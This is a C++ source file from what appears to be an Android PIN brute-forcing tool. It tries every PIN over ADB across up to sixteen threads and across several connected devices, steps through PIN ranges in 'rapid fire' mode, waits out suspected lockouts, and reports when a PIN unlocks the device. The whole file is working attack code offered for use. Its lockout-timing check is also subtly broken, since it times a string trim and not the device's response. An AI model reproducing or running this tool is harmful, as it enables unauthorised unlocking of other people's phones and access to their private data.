#include "usb_attack.h"
#include "adb.h"
#include "adb_native.h"
#include "util.h"
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <thread>
#include <atomic>
#include <vector>
#include <mutex>
#include <chrono>

static std::atomic<int> g_found(0);
static std::atomic<long> g_progress(0);
static std::mutex g_print_mutex;

static void worker_thread_fn(int thread_id, int digits, long start, long end,
                             int delay_ms, std::atomic<long> *global_progress) {
    char buf[128];
    snprintf(buf, sizeof(buf), "adb_native_t_%d", thread_id);

    for (long i = start; i < end && !g_found.load(); i++) {
        char pin[16];
        snprintf(pin, sizeof(pin), "%0*ld", digits, i);

        /* Try PIN via native ADB */
        if (adb_enter_pin_sakti(pin) && adb_is_unlocked()) {
            g_found.store(1);
            std::lock_guard<std::mutex> lock(g_print_mutex);
            printf(GREEN "\n[!!!] PIN FOUND by thread %d: %s\n" RESET, thread_id, pin);
            return;
        }

        if (delay_ms > 0) std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
        (*global_progress)++;
    }
}

extern "C" {

int usb_multi_attack(int digits, int channels, int delay_ms) {
    long total = 1;
    for (int i=0; i<digits; i++) total *= 10;
    if (channels < 1) channels = 1;
    if (channels > 16) channels = 16;

    printf("[*] Multi-channel attack: %d channels x %ld PINs (%dms)\n",
           channels, total, delay_ms);

    long chunk = (total + channels - 1) / channels;
    std::vector<std::thread> threads;
    g_found.store(0);
    g_progress.store(0);

    auto t0 = std::chrono::steady_clock::now();

    for (int t=0; t<channels; t++) {
        long s = t * chunk;
        long e = std::min(s + chunk, total);
        if (s >= total) break;
        threads.emplace_back(worker_thread_fn, t, digits, s, e, delay_ms, &g_progress);
    }

    /* Progress monitor */
    while (!g_found.load()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        long p = g_progress.load();
        auto t1 = std::chrono::steady_clock::now();
        double elapsed = std::chrono::duration<double>(t1 - t0).count();
        if (elapsed > 0) {
            printf("\r[MULTI] %ld/%ld | %.1f/s | %.0fs ", p, total, p/elapsed, elapsed);
            fflush(stdout);
        }
        if (p >= total) break;
    }

    for (auto &t : threads) if (t.joinable()) t.join();

    if (g_found.load()) return 1;
    printf("\n");
    return 0;
}

int usb_detect_lockout_timing(void) {
    double times[5];
    for (int i=0; i<5; i++) {
        char *out = adb_shell("adb shell dumpsys window 2>/dev/null | head -1");
        auto t0 = std::chrono::steady_clock::now();
        trim_newline(out);
        auto t1 = std::chrono::steady_clock::now();
        times[i] = std::chrono::duration<double, std::milli>(t1 - t0).count();
    }

    double avg = 0;
    for (int i=0; i<5; i++) avg += times[i];
    avg /= 5;

    /* Lockout causes significantly slower responses (>500ms extra) */
    printf("[*] USB response time: %.1f ms avg\n", avg);
    if (avg > 800) {
        printf(YELLOW "[!] High latency (%d ms) - likely in lockout\n" RESET, (int)avg);
        return 1;
    }
    return 0;
}

int usb_rapid_fire(const char *start_pin, const char *end_pin) {
    int digits = (int)strlen(start_pin);
    long s = atol(start_pin);
    long e = end_pin ? atol(end_pin) : 0;
    long total = 1;
    for (int i=0; i<digits; i++) total *= 10;
    if (e==0 || e>total) e = total;

    printf("[*] Rapid fire: %s -> %s (%ld PINs)\n", start_pin,
           end_pin?end_pin:start_pin+digits, e-s);

    for (long i=s; i<e; i++) {
        char pin[16];
        snprintf(pin, sizeof(pin), "%0*ld", digits, i);

        /* Check lockout every 5 trys */
        if ((i-s)%5==0 && usb_detect_lockout_timing()) {
            printf(YELLOW "\n[!] Lockout at %s. Waiting 30s...\n" RESET, pin);
            int w=30;
            while (w>0) { printf("%d..",w); fflush(stdout); sleep(1); w--; }
            printf("\n");
        }

        if (adb_enter_pin_sakti(pin) && adb_is_unlocked()) {
            printf(GREEN "\n[!!!] PIN FOUND: %s\n" RESET, pin);
            return 1;
        }

        if (i%50==0) { printf("\r[RAPID] %ld/%ld", i-s, e-s); fflush(stdout); }
    }
    printf("\n");
    return 0;
}

int usb_multi_device_brute(const char *serials[], int nserials, int digits, int delay_ms) {
    if (nserials <= 0) {
        printf(YELLOW "[-] No serials provided\n" RESET);
        return 0;
    }
    printf("[*] Multi-device brute: %d devices x %d-digit PINs\n", nserials, digits);

    for (int d=0; d<nserials; d++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "adb -s %s shell getprop ro.serialno 2>/dev/null",
                 serials[d]);
        printf("[*] Device %d: %s\n", d+1, serials[d]);
    }

    /* Brute each device sequentially for now */
    for (int d=0; d<nserials; d++) {
        printf("\n" BOLD "=== Device %d: %s ===" RESET "\n", d+1, serials[d]);
        extern int brute_adv(int digits, int delay_ms, long start, long end,
                            int resume, int skip_confirm);
        if (brute_adv(digits, delay_ms, 0, 0, 0, 1)) return 1;
    }
    return 0;
}

int usb_enum_all_devices(char out[][64], int max) {
    int count = 0;
    char *devs = adb_shell("adb devices -l 2>/dev/null");
    if (!devs) return 0;

    char *line = devs;
    while (line && count < max) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;

        if (strstr(line, "device") && !strstr(line, "devices") && !strstr(line, "unauthorized")) {
            char serial[64]={0};
            sscanf(line, "%63s", serial);
            if (strlen(serial) > 0) {
                strncpy(out[count], serial, 63);
                count++;
            }
        }
        line = nl ? nl+1 : NULL;
    }
    return count;
}

}
